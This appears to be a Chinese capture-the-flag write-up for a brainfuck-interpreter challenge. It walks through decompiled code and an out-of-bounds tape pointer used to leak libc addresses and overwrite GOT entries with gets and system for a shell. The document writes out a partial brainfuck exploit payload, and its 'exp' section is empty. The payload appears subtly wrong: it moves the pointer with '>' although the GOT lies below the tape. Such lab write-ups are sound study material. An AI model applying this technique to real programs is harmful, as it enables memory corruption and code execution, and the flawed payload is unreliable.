# pwnable--pwn--bf

题目有关brainfuck

main函数

```c
 p = (int)&tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(s, 0, 0x400u);
  fgets(s, 1024, stdin);
  for ( i = 0; i < strlen(s); ++i )
    do_brainfuck(s[i]);
  return 0;
```

do_brainfuck

```c
result = a1;
  switch ( a1 )
  {
    case '+':
      result = p;
      ++*(_BYTE *)p;                            // 指针指向的内容加1
      break;
    case ',':
      v2 = (_BYTE *)p;
      result = getchar();                       // 输入内容到指针指向的单元内容
      *v2 = result;
      break;
    case '-':
      result = p;                               // 指针指向的内容减1
      --*(_BYTE *)p;
      break;
    case '.':
      result = putchar(*(char *)p);             // 输出指针指向的单元内容
      break;
    case '<':
      result = p-- - 1;                         // 指针减1
      break;
    case '>':
      result = p++ + 1;                         // 指针加1
      break;
    case '[':
      result = puts("[ and ] not supported.");   //while(*ptr){
      break;
    default:
      return result;
  }
  return result;
```

这个程序的功能就是：

0x1  用户输入一段fk程序

0x2  将其翻译并执行   

这里注意：执行时还是在这个进程中 甚至可以说在这个函数中，他并没有任何隔离措施，所以我们可以使用bf来输出和写入这个进程的内存

题目给了个libc.so,估计就是改写got表

main()中的三个函数：puts() ,memset(), fget(). 

memset()和 fgets()的参数都是同一个  我们就将 memset()改为gets(),将fgets()改为system()

memset和fgets的got地址可以利用可执行文件得到

gets和system需要获得偏移地址

那么我们就要得到putchar函数，输出真实地址求偏移

### 第一步 利用bf构造语句输出putchar地址

ptr地址

```
.bss:0804A0A0 tape            db    ? ;               ; DATA XREF: main+6D↑o
.bss:0804A0A1                 db    ? ;
.bss:0804A0A2                 db    ? ;
```

memset_got: 0x804a02c

putchar_got：0x804A030

```
 extrn memset:near       ; CODE XREF: _memset↑j
extern:0804A4C0                                         ; DATA XREF: .got.plt:off_804A02C↑o
extern:0804A4C4 ; int putchar(int c)
extern:0804A4C4                 extrn putchar:near      ; CODE XREF: _putchar↑j
extern:0804A4C4                                         ; DATA XREF: .got.plt:off_804A030↑o
```

bf语句

```
'>'*(0x0804a0a0-0x0804a030)
+'.'				juck code
+'.>'*4             输出putchar全局地址
+'<'*4
+',>'*4				write put_char
+'<'*(4+4)
+',>'*4             write memset
+'<'*(0x2c-0x10+4)
+',>'*4            write fgets
+'.'               最后调用printchar 实际是main
```

main 地址 0x8048671

### 第二步 计算system和get

exp:

```



```

